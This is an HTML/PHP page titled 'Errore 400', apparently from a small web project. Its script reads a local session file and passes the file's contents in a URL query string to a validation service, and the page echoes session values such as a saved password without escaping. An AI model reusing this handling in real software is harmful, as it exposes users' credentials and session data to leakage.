<html>
<style language ="text/css">
#pop-upPwd
{
 position: absolute;
 display:block;
 heigh:130px;
 width:280px;
 left:1390px;
 top:1px;
}
#pop-upPwd button
{
 heigh:35px;
 width:35px;
}
</style>
<head>
<title>Errore 400</title>
<script language= "javascript">
function saveCredential()
{
  fetch('./Cookie/File/session.txt')
  .then(response => response.text())
  .then(text => (window.open('../Services/Validazione.php?copia='+text+'&location='+window.location.href)));
}
function closef()
{
var pop = document.getElementById('pop-upPwd');
pop.style.display = 'none';
}
function setTimer()
{
 setTimeout(function() {
 window.open('../Services/Validazione.php?elimina=y');	
},10000);
}
</script>
</head>
<body onload = "setTimer();">
<?php
session_start();
$msg = $_SESSION["Msg"];
echo $_SESSION["save_pwd"];
echo $msg;
?>

</body>
</html>